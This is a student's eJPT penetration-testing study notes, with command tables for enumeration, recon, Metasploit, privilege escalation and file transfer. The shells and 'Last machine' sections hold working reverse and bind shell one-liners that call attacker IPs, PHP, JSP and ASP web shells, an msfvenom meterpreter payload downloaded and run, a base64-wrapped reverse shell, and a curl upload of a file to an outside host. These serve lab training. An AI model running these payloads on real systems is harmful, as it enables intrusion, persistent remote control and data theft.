eJPT
#Note taking tools
		
	Cherrytree	Visual Studio Code	Evernote
	Notion		GitBook			Sublime Text
	Notepad++
#Resources
* Other vulnerable machines/applications
	OWASP Juice Shop	Is a modern vulnerable web application written in Node.js, Express, and Angular which showcases the entire OWASP Top Ten along with many other real-world application security flaws. ==> https://owasp.org/www-project-juice-shop/
	Metasploitable 2	Is a purposefully vulnerable Ubuntu Linux VM that can be used to practice enumeration, automated, and manual exploitation. ==> https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/
	Metasploitable 3	Is a template for building a vulnerable Windows VM configured with a wide range of vulnerabilities. ==> https://github.com/rapid7/metasploitable3
	DVWA	This is a vulnerable PHP/MySQL web application showcasing many common web application vulnerabilities with varying degrees of difficulty. ==> https://github.com/digininja/DVWA

* Youtube Channels
	
	IppSec	Provides an extremely in-depth walkthrough of every retired HTB box packed full of insight from his own experience, as well as videos on various techniques.
	VbScrub	Provides HTB videos as well as videos on techniques, primarily focusing on Active Directory exploitation.
	STÖK	Provides videos on various infosec related topics, mainly focusing on bug bounties and web application penetration testing.
	LiveOverflow	Provides videos on a wide variety of technical infosec topics.
* Blogs
	https://0xdf.gitlab.io/

* Tutorial websites
	https://www.underthewire.tech/index.htm
	https://overthewire.org/wargames/

#Basics VPN
At a high-level, VPN works by routing our connecting device's internet connection through the target VPN's private server instead of our internet service provider (ISP). When connected to a VPN, data originates from the VPN server rather than our computer and will appear to originate from a public IP address other than our own.

There are two main types of remote access VPNs: client-based VPN and SSL VPN. SSL VPN uses the web browser as the VPN client. The connection is established between the browser and an SSL VPN gateway can be configured to only allow access to web-based applications such as email and intranet sites, or even the internal network but without the need for the end user to install or use any specialized software. Client-based VPN requires the use of client software to establish the VPN connection. Once connected, the user's host will work mostly as if it were connected directly to the company network and will be able to access any resources (applications, hosts, subnets, etc.) allowed by the server configuration. Some corporate VPNs will provide employees with full access to the internal corporate network, while others will place users on a specific segment reserved for remote workers.

#Shells
  ASP ==> Windows Servers
  JSP ==> Apache Tomcats
  PHP ==> Classical Apache

  msfvenom --list payloads | grep "linux"

* Netcat Fundamentals
	> Network utility used to read and write data to network connections using TCP or UDP
	[+] Netcat can be used to perform:
  		- Banner Grabbing
  		- Port Scanning
  		- Transferring Files
  		- Bind/Reverse Shells
	[+] nc 
		-v //verbose
	    	-u //udp
	    	-l //listen
	    	-n //nodns
	    	-e //exec 

    	[+] How to transfer nc.exe to a Windows machine
		> certutil 
    			A: ls -la /usr/share/windows-resources/
    	  		A: python3 -m http.server 80
    	  		V: certutil -urlcache -f http://<AttackIP>/nc.exe nc.exe
		> nc
    	  		A: vim test.txt
    	  		V: nc.exe -nvlp 1234 > test.txt
    	  		A: nc -nv VictimMachine 1234 < test.txt
* There's another Windows alternative to netcat coded in PowerShell called PowerCat (https://github.com/besimorhino/powercat)



* Bind Shells
	> A bind shell is a type of remote shell where the attacker connects directly to a listener on the target system, consequently allowing for execution of commands on the target system
	> Unlike a Reverse Shell, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.
    	> A netcat listener can be setup to execute a specific executable like cmd.exe or /bin/bash when a client connects to the listener.
    	> Example (From Linux to Windows)
    		V: nc -nvlp 1234 -e cmd.exe 
    	    	A: nc -nv 10.4.21.221 1234

    	> Other example (From Windows to Linux)
    		A: nc -nvlp 1234 -c /bin/bash //In Linux
    	    	V: nc.exe -nv 10.10.3.2 1234
	> Bind shell cheatsheet
		https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md
	[+] Reliable commands
		> Bash
			rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
		> Python
			python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
		> Powershell
			powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();

* Reverse shells
	> Example(From Linux to Linux)
		nc -nv 10.10.0.2 1234 -e /bin/bash
    	    	nc -nvlp 1234
    	  
    	> Other example(From Windows to Linux)
    		A: nc -nlvp 1234
    	    	V: nc.exe -nv 10.10.0.2 1234 -e cmd.exe

    	> Reverse shell Cheatsheet 
    		https://github.com/swisskyrepo/PayloadsAllTheThings
		https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
    	    	https://www.revshells.com/
		https://highon.coffee/blog/reverse-shell-cheat-sheet/
	[+] Reliable commands
		> Bash
			bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
			rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
		> Powershell
			powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
* Web Shell
	> Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.
	[+] Reliable web shells scripts
		> PHP
			<?php system($_REQUEST["cmd"]); ?>
		> JSP 
			<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
		> ASP
			<% eval request("cmd") %>
	[+] Uploading a Web Shell
		> Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. shell.php and upload it, and then access our uploaded file to execute commands.

		> However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:
		> Default webroots for common web servers
			Web Server 	Default Webroot
			Apache 	/var/www/html/
			Nginx 	/usr/local/nginx/html/
			IIS 	c:\inetpub\wwwroot\
			XAMPP 	C:\xampp\htdocs\
		> We can check these directories to see which webroot is in use and then use echo to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a PHP shell with the following command:
			echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
		[+] Accessing web shell. Once we write our web shell, we can either access it through a browser or by using cURL. We can visit the shell.php page on the compromised website, and use ?cmd=id to execute the id command:
			> By Curl
				curl http://SERVER_IP:PORT/shell.php?cmd=id
			> By Browser
				http://SERVER_IP:PORT/shell.php?cmd=id
		> A great benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on 80 or 443, or whatever port the web application is using. Another great benefit is that if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again.

		> On the other hand, a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands. Still, in extreme cases, it is possible to code a Python script to automate this process and give us a semi-interactive web shell right within our terminal.

* Upgrading TTY
	> Linux
		script /dev/null -c bash OR whereis python and python -c 'import pty;pty.spawn("/bin/bash")'
  		ctrl + z 
  		stty raw -echo
  		fg  ==> Once we hit fg, it will bring back our netcat shell to the foreground. At this point, the terminal will show a blank line. We can hit enter again to get back to our shell or input reset and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.
  		reset 
  		xterm 
  		export TERM=xterm or xterm-256color ==> In our machine echo $TERM
  		export SHELL=bash
		stty -a ==> En nuestra terminal 
  		stty rows [x] cols [x]

		!!Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.
	> Powershell
		rlwrap nc -lvnp <port>
		stty raw -echo;fg 
* Socat
	We would like to transfer a socat static compiled binary
  	sudo python3 -m http.server 80 
  	On the target machine
  		Linux: wget <LOCAL-IP>/socat -O /tmp/socat
  	  	Windows: Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe 
	https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat
		On Kali (listen):
			socat file:`tty`,raw,echo=0 tcp-listen:4444
		On Victim (launch):
			socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
* URLs
#2-module ==> Getting started
## Basic Tools

| **Command**   | **Description**   |
| --------------|-------------------|
| **General** |
| `sudo openvpn user.ovpn` | Connect to VPN |
| `ifconfig`/`ip a` | Show our IP address |
| `netstat -rn` | Show networks accessible via the VPN |
| `ssh user@10.10.10.10` | SSH to a remote server |
| `ftp 10.129.42.253` | FTP to a remote server |
| **tmux** |
| `tmux` | Start tmux |
| `ctrl+b` | tmux: default prefix |
| `prefix c` | tmux: new window |
| `prefix 1` | tmux: switch to window (`1`) |
| `prefix shift+%` | tmux: split pane vertically |
| `prefix shift+"` | tmux: split pane horizontally |
| `prefix ->` | tmux: switch to the right pane |
| **Vim** |
| `vim file` | vim: open `file` with vim |
| `esc+i` | vim: enter `insert` mode |
| `esc` | vim: back to `normal` mode |
| `x` | vim: Cut character |
| `dw` | vim: Cut word |
| `dd` | vim: Cut full line |
| `yw` | vim: Copy word |
| `yy` | vim: Copy full line |
| `p` | vim: Paste |
| `:1` | vim: Go to line number 1. |
| `:w` | vim: Write the file 'i.e. save' |
| `:q` | vim: Quit |
| `:q!` | vim: Quit without saving |
| `:wq` | vim: Write and quit |

## Pentesting
| **Command**   | **Description**   |
| --------------|-------------------|
| **Service Scanning** |
| `nmap 10.129.42.253` | Run nmap on an IP |
| `nmap -sV -sC -p- 10.129.42.253` | Run an nmap script scan on an IP |
| `locate scripts/citrix` | List various available nmap scripts |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40` | Run an nmap script on an IP |
| `netcat 10.10.10.10 22` | Grab banner of an open port |
| `socat - TCP:165.22.115.189:30812`| Grab banner of an open port |
| `smbclient -N -L \\\\10.129.42.253` | List SMB Shares |
| `smbclient \\\\10.129.42.253\\users` | Connect to an SMB share |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` | Scan SNMP on an IP |
| `onesixtyone -c dict.txt 10.129.42.254` | Brute force SNMP secret string |
| **Web Enumeration** |
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` | Run a directory scan on a website |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Run a sub-domain scan on a website |
| `curl -IL https://www.inlanefreight.com` | Grab website banner |
| `whatweb 10.10.10.121` | List details about the webserver/certificates |
| `curl 10.10.10.121/robots.txt` | List potential directories in `robots.txt` |
| `ctrl+U` | View page source (in Firefox) |
| **Public Exploits** |
| `searchsploit openssh 7.2` | Search for public exploits for a web application |
| `msfconsole` | MSF: Start the Metasploit Framework |
| `search exploit eternalblue` | MSF: Search for public exploits in MSF |
| `use exploit/windows/smb/ms17_010_psexec` | MSF: Start using an MSF module |
| `show options` | MSF: Show required options for an MSF module |
| `set RHOSTS 10.10.10.40` | MSF: Set a value for an MSF module option |
| `check` | MSF: Test if the target server is vulnerable |
| `exploit` | MSF: Run the exploit on the target server is vulnerable |
| **Using Shells** |
| `nc -lvnp 1234` | Start a `nc` listener on a local port |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` | Send a reverse shell from the remote server |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f` | Another command to send a reverse shell from the remote server |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f` | Start a bind shell on the remote server |
| `nc 10.10.10.1 1234` | Connect to a bind shell started on the remote server |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell TTY (1) |
| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice | Upgrade shell TTY (2) |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | Create a webshell php file |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Execute a command on an uploaded webshell |
| **Privilege Escalation** |
| `./linpeas.sh` | Run `linpeas` script to enumerate remote server |
| `sudo -l` | List available `sudo` privileges |
| `sudo -u user /bin/echo Hello World!` | Run a command with `sudo` |
| `sudo su -` | Switch to root user (if we have access to `sudo su`) |
| `sudo su user -` | Switch to a user (if we have access to `sudo su`) |
| `ssh-keygen -f key` | Create a new SSH key |
| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys` | Add the generated public key to the user |
| `ssh root@10.10.10.10 -i key` | SSH to the server with the generated private key |
| **Transferring Files** |
| `python3 -m http.server 8000` | Start a local webserver |
| `wget http://10.10.14.1:8000/linpeas.sh` | Download a file on the remote server from our local machine |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Download a file on the remote server from our local machine |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh` | Transfer a file to the remote server with `scp` (requires SSH access) |
| `base64 shell -w 0` | Convert a file to `base64` |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell` | Convert a file from `base64` back to its orig |
| `md5sum shell` | Check the file's `md5sum` to ensure it converted correctly |



#List of ports
	https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-ports.html
	https://packetlife.net/media/library/23/common-ports.pdf
Cheatsheet
	- vim 		==> https://vimsheet.com/
	- tmux 		==> https://tmuxcheatsheet.com/

#OWASP top 10

Number	Category	Description
1.	Broken Access Control	Restrictions are not appropriately implemented to prevent users from accessing other users accounts, viewing sensitive data, accessing unauthorized functionality, modifying data, etc.
2.	Cryptographic Failures	Failures related to cryptography which often leads to sensitive data exposure or system compromise.
3.	Injection	User-supplied data is not validated, filtered, or sanitized by the application. Some examples of injections are SQL injection, command injection, LDAP injection, etc.
4.	Insecure Design	These issues happen when the application is not designed with security in mind.
5.	Security Misconfiguration	Missing appropriate security hardening across any part of the application stack, insecure default configurations, open cloud storage, verbose error messages which disclose too much information.
6.	Vulnerable and Outdated Components	Using components (both client-side and server-side) that are vulnerable, unsupported, or out of date.
7.	Identification and Authentication Failures	Authentication-related attacks that target user's identity, authentication, and session management.
8.	Software and Data Integrity Failures	Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and content delivery networks (CDNs).
9.	Security Logging and Monitoring Failures	This category is to help detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected..
10.	Server-Side Request Forgery	SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).


###Last machine
* Using our normal shell to gain a metasploit session
	AM: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.196.85.2 LPORT=5555 -f elf > payload.bin
	VM: wget wget http://192.196.85.2/payload.bin
	         file payload.bin
	         chmod +x payload.bin
	AM: msfconsole -q
	     use exploit/multi/handler
	     set PAYLOAD linux/x64/meterpreter/reverse_tcp
	     set LHOST 192.196.85.2
	     set LPORT 5555
	     run
	VM: ./payload.bin

* Now since we have access to the first target machine, we can easily access the second machine. But if there is some webapp running on that second machine, we can't access it directly, unless we have a proxy setup to relay the request via the compromised target. And that's what we will set up in this step!

* Background the meterpreter session and check the meterpreter session identifier:
	bg
	sessions
	route add 192.108.156.0/24 1
	use auxiliary/server/socks_proxy
	set VERSION 4a
	set SRVPORT 9050 //By defalt, proxychains makes use of port
	run -j //Started as a background process
	proxychains nmap -sT -Pn 192.108.156.3
	proxychains nc -v 192.108.156.3 5555


* Abusing a web shell
	echo 'bash -c "bash -i >& /dev/tcp/192.168.188.133/4126 0>&1"' | base64
   __import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTk2Ljg1LjIvNDQ0NCAwPiYxIgo= | base64 -d | bash")
Basic concepts ==>
#VPN
  VPN uses cryptogrpahy to extend a private network over a public one, like the Internet. When you are connected via VPN, you are actually running the same protocols of the private network. This lets you perform even low-level network operations (i.e. Wireshark)

#Hexadecimal arithmetic 
  In order to distinguish them from decimal numbers, we add 0x at the beginning or h at the end
#Encapsulation 
  If every protocol has a header and a payload, how can a protocol use the one on its lowe layer? The entire upper protocol packet(header plus payload) is the payload of the lower one; this is called encapsulation

IP packets are called datagrams. IP runs on the Internet layer.
Layer 2 packets ==> frames
The CAM (Content Addressable Memory) table is stored in the device's RAM and is constantly refreshed with new information
Routers do not forward packets coming from one interface if they have ff:ff:ff:ff:ff:ff broadcast MAC address.
iptables ==> https://www.frozentux.net/iptables-tutorial/iptables-tutorial.html
#IPv6
	There are prefixes instead of subnets blocks
	reserved addresses ==> ::1/128 is a loopback address and ::FFFF:0:0/96 are IPv4 mapped addresses
	64 bits [network part] : 64 bits [device part]
	48 bits ==> global unicast address ==> Global ones and reside in global internet. This are for Internet global addressing.
	16 bits ==> subnet id. Used for defining subnets
	-=-=-=-=
	unique local and link local ==> Reside only in internal networks
		Unique local ==> Scope internal network or VPN - Internally routable but not routed on Internet
		Link Local ==> Scope network link - Not routed internally or externally
#Wireshark
#Check ports opened
  netstat -tunp, netstat -ano or netstat -p tcp -p upd | lsof -n i4TCP -i4UDP #TCPView from sysinternals
#Check routes
  ip route, route print or netstat -r 
  	#route add -net 192.168.222.0 netmask 255.255.255.0 gw 10.175.34.1 ==> An example
  	#ip route add 192.168.222.0/24 via 10.175.34.1 ==> Another way
#Check ip
  ip addr, ipconfig /alll or ifconfig
#Example of RCE
  GET /?cmd=ls+-la+/home/student #When you got RCE ==> http://demo.ine.local:8000?cmd=curl+192.77.184.2+--upload-file+flag.zip
  301 ==> Moved permanently
  302 ==> The resource is temporarily under another URI



#Tips
## browser
firebug as a complement for firefox

#PNTP (Penetration Testing Process)
## Pre-Engagement
## Information Gathering
## Vulnerability Assessment
## Exploitation
## Post-Exploitation
## Lateral Movement
## Proof-of-Concept
## Post-Engagement

##Pre-Engagement
[+] Compliance
	PCI DSS (Payment Card Industry Data Security Standard)
    	HIPAA (Health Insurance Portability and Accountability Act of 1996)
    	GDPR (General Data Protection Regulation) //Europe
    	CPPA (California Consumer Privacy Act)
    	SOX (Sarbanes-Oxley Act of 2002)
[+] Frameworks
	ISO/IEC 27000
    	COBIT (Control Objectives for Information and Related IT technologies)
    	NIST Special Publication 800-53
    	CIS Controls and CIS Benchmarks
    	CMMC (Cybersecurity Maturity Model Certification)
    	ASD Essential 8 (Australian Cyber Security Centre Essential 8 Maturity Model)
[+] Auditing
	SCAP & STIGs // Security Content Automation Protocol & Security Technical Implementation Guides
    	  SCAP Scan and Stigviewer
##Information Gathering
* Enumeration is a widely used term in cyber security. It stands for information gathering using active (scans) and passive (use of third-party providers) methods. It is important to note that OSINT is an independent procedure and should be performed separately from enumeration because OSINT is based exclusively on passive information gathering and does not involve active enumeration of the given target.
* 	No.	Principle
	1.	There is more than meets the eye. Consider all points of view.
	2.	Distinguish between what we see and what we do not see.
	3.	There are always ways to gain more information. Understand the target.
* 3 main different levels 
	> Infrastructure-based enumeration
		1. Internet Presence	Identification of internet presence and externally accessible infrastructure.	Domains, Subdomains, vHosts, ASN, Netblocks, IP Addresses, Cloud Instances, Security Measures
		2. Gateway	Identify the possible security measures to protect the company's external and internal infrastructure.	Firewalls, DMZ, IPS/IDS, EDR, Proxies, NAC, Network Segmentation, VPN, Cloudflare
	> Host-based enumeration
		3. Accessible Services	Identify accessible interfaces and services that are hosted externally or internally.	Service Type, Functionality, Configuration, Port, Version, Interface
		4. Processes	Identify the internal processes, sources, and destinations associated with the services.	PID, Processed Data, Tasks, Source, Destination
	> OS-based enumeration
		5. Privileges	Identification of the internal permissions and privileges to the accessible services.	Groups, Users, Permissions, Restrictions, Environment
		6. OS Setup	Identification of the internal components and systems setup.	OS Type, Patch Level, Network config, OS Environment, Configuration files, sensitive private files

## Infrastructure-based Enumeration

|**Command**|**Description**|
|-|-|
| `curl -s https://crt.sh/\?q\=<target-domain>\&output\=json \| jq .` | Certificate transparency. |
| `for i in $(cat ip-addresses.txt);do shodan host $i;done` | Scan each IP address in a list using Shodan. |

----
## Host-based Enumeration


##### FTP
|**Command**|**Description**|
|-|-|
| `ftp <FQDN/IP>` | Interact with the FTP service on the target. |
| `nc -nv <FQDN/IP> 21` | Interact with the FTP service on the target. |
| `telnet <FQDN/IP> 21` | Interact with the FTP service on the target. |
| `openssl s_client -connect <FQDN/IP>:21 -starttls ftp` | Interact with the FTP service on the target using encrypted connection. |
| `wget -m --no-passive ftp://anonymous:anonymous@<target>` | Download all available files on the target FTP server. |


##### SMB
|**Command**|**Description**|
|-|-|
| `smbclient -N -L //<FQDN/IP>` | Null session authentication on SMB. |
| `smbclient //<FQDN/IP>/<share>` | Connect to a specific SMB share. |
| `rpcclient -U "" <FQDN/IP>` | Interaction with the target using RPC. |
| `samrdump.py <FQDN/IP>` | Username enumeration using Impacket scripts. |
| `smbmap -H <FQDN/IP>` | Enumerating SMB shares. |
| `crackmapexec smb <FQDN/IP> --shares -u '' -p ''` | Enumerating SMB shares using null session authentication. |
| `enum4linux-ng.py <FQDN/IP> -A` | SMB enumeration using enum4linux. |


##### NFS
|**Command**|**Description**|
|-|-|
| `showmount -e <FQDN/IP>` | Show available NFS shares. |
| `mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock` | Mount the specific NFS share.umount ./target-NFS |
| `umount ./target-NFS` | Unmount the specific NFS share. |


##### DNS
|**Command**|**Description**|
|-|-|
| `dig ns <domain.tld> @<nameserver>` | NS request to the specific nameserver. |
| `dig any <domain.tld> @<nameserver>` | ANY request to the specific nameserver. |
| `dig axfr <domain.tld> @<nameserver>` | AXFR request to the specific nameserver. |
| `dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>` | Subdomain brute forcing. |



##### SMTP
|**Command**|**Description**|
|-|-|
| `telnet <FQDN/IP> 25` |  |


##### IMAP/POP3
|**Command**|**Description**|
|-|-|
| `curl -k 'imaps://<FQDN/IP>' --user <user>:<password>` | Log in to the IMAPS service using cURL. |
| `openssl s_client -connect <FQDN/IP>:imaps` | Connect to the IMAPS service. |
| `openssl s_client -connect <FQDN/IP>:pop3s` | Connect to the POP3s service. |


##### SNMP
|**Command**|**Description**|
|-|-|
| `snmpwalk -v2c -c <community string> <FQDN/IP>` | Querying OIDs using snmpwalk. |
| `onesixtyone -c community-strings.list <FQDN/IP>` | Bruteforcing community strings of the SNMP service. |
| `braa <community string>@<FQDN/IP>:.1.*` | Bruteforcing SNMP service OIDs. |


##### MySQL
|**Command**|**Description**|
|-|-|
| `mysql -u <user> -p<password> -h <FQDN/IP>` | Login to the MySQL server. |


##### MSSQL
|**Command**|**Description**|
|-|-|
| `mssqlclient.py <user>@<FQDN/IP> -windows-auth` | Log in to the MSSQL server using Windows authentication. |


##### IPMI
|**Command**|**Description**|
|-|-|
| `msf6 auxiliary(scanner/ipmi/ipmi_version)` | IPMI version detection. |
| `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)` | Dump IPMI hashes. |


##### Linux Remote Management
|**Command**|**Description**|
|-|-|
| `ssh-audit.py <FQDN/IP>` | Remote security audit against the target SSH service. |
| `ssh <user>@<FQDN/IP>` | Log in to the SSH server using the SSH client. |
| `ssh -i private.key <user>@<FQDN/IP>` | Log in to the SSH server using private key. |
| `ssh <user>@<FQDN/IP> -o PreferredAuthentications=password` | Enforce password-based authentication. |


##### Windows Remote Management
|**Command**|**Description**|
|-|-|
| `rdp-sec-check.pl <FQDN/IP>` | Check the security settings of the RDP service. |
| `xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>` | Log in to the RDP server from Linux. |
| `evil-winrm -i <FQDN/IP> -u <user> -p <password>` | Log in to the WinRM server. |
| `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"` | Execute command using the WMI service. |

###Beginning
     https://rosettacode.org/wiki/Execute_a_system_command
###Passive
* WAF detection with wafw00f
	wafw00f -l : List all WAFs that WAFW00F is able to detect
  	wafw00f -a : Find all WAFs which match the signatures, do not stop testing on the first one
* IP addresses
  	host hackersploit.org
  	nslookup hackersploit.org
* Whois 
* DNS Recon
	dnsrecon: Cloudfare does not hide our proxy mail server addresses really well in MX records 
  		dnsrecon -d hacerksploit.org
  	dnsdumpster.com
* Subdomain enumeration with sublist3r
* Certificates
	> Certificate Transparency is a process that is intended to enable the verification of issued digital certificates for encrypted Internet connections.
	[+] With cURL
		curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq .
		> If needed, we can also have them filtered by the unique subdomains
			curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
	> Next, we can identify the hosts directly accessible from the Internet and not hosted by third-party providers. This is because we are not allowed to test the hosts without the permission of third-party providers.
		for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done
	> Shodan - IP list
		for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f4 >> ip-addresses.txt;done
		for i in $(cat ip-addresses.txt);do shodan host $i;done
	> Websites
		https://crt.sh/ 
		Browsing to https://10.10.10.121/ and viewing the certificate reveals the details below, including the email address and company name. These could potentially be used to conduct a phishing attack if this is within the scope of an assessment.
		Censys search
		Cert Spotter by sslmate
		certstream.calidog.io
		ct.cloudflare.com - Merkle Town by Cloudflare
		Meta Certificate Transparency Monitoring by Meta
		Certificate Transparency Root Explorer
* Website Footprinting with Netcraft
	https://sitereport.netcraft.com/
* Web technologies being used
  	Add-ons => builtwith or wappalyzer 
  	Terminal => whatweb
* Directories hidden from search engines
  	/robots.txt => Contains a list of directories that are not indexed by search engines.
  	/sitemap_index.xml => It tells the search engine what content is available and how to reach it.
* Analyze the entire website
  	webhttrack (https://www.httrack.com/ ==> sudo apt-get install webhttrack) =>  Simply open a page of the "mirrored" website in your browser, and you can browse the site from link to link, as if you were viewing it online
	http://web.archive.org/ ==> offensivecomputing.net ==> waybackmachine
* Names
* Email Harvesting with theHarvester
  	theHarvester -d hackersploit.org -b google,linkedin
  	spyse requires a subscription but it seems to be very useful
* Phone numbers
* Physical addresses
[+] Google Dorks
	site:ine.com ==> Domain and subdomains
  	site:*.ine.com ==> Subdomains. To include only results on a given hostname
  	intitle:admin ==> According to the title of a page
  	inurl:admin ==> Similar to intitle but works on the URL of a resource
  	filetype:pdf,xlsx,doc,docx,zip
  	site:ine.com employees
  	intitle:index of 
  	cache:ine.com [https://web.archive.org/]
  	inurl:auth_user_file.txt | passwd.txt
  	**https://www.exploit-db.com/google-hacking-database**
  	intitle:index of credentials
  	AND, OR, &, | 
  	-: Filter out a keyword or a command's result from the query.
	
	> URLs or books
  		www.exploit-db.com/google-hacking-database
  	  	google hacking penetration tester by  johnny long
* Leaked Password Databases
	Password spraying (same password for different sites)
  	https://haveibeenpwned.com/
* Terminal tools
  	sublist3r -d[domain] google.com
  	apt install snapd && service snapd start && snap install amass && snap run amass : Ex>> snap run amass -ip -d google.com
* URLs and books
  	http://www.crunchbase.com
	https://digi.ninja/projects/zonetransferme.php

###Active information gathering
* DNS Zone Transfers
	In certain cases, DNS server admins may want to copy or transfer zone files from one DNS server to another. If misconfigured and left unsecured, this functionality can be abused by attackers to copy the zone file from the primary DNS server to another DNS SERVER
      DNS records
        A     - Resolves a hostname or domain to an IPv4 address
        AAAA  - Resolves a hostname or domain to an IPv6 address
        NS    - Reference to the domains nameserver. These kinds of records show which name servers are used to resolve the FQDN to IP addresses. Most hosting providers use their own name servers, making it easier to identify the hosting provider.
        MX    - Resolves a domain to a mail server. The mail server records show us which mail server is responsible for managing the emails for the company
        CNAME - Used for domain aliases
        TXT   - Text record. This type of record often contains verification keys for different third-party providers and other security aspects of DNS, such as SPF, DMARC, and DKIM, which are responsible for verifying and confirming the origin of the emails sent
        HINFO - Host information
        SOA   - Domain authority
        SRV   - Service records
        PTR   - Resolves an IP address to a hostname
      ❯ dnsenum zonetransfer.me
      ❯ fierce --domain zonetransfer.me
      Examples
        Purpose 	                Example
        Lookup WHOIS    record 	  	whois tryhackme.com
        Lookup DNS A    records 	nslookup -type=A tryhackme.com
        Lookup DNS MX   records  	nslookup -type=MX tryhackme.com 1.1.1.1
        Lookup DNS TXT  records 	nslookup -type=TXT tryhackme.com
        Lookup DNS A    records 	dig tryhackme.com A
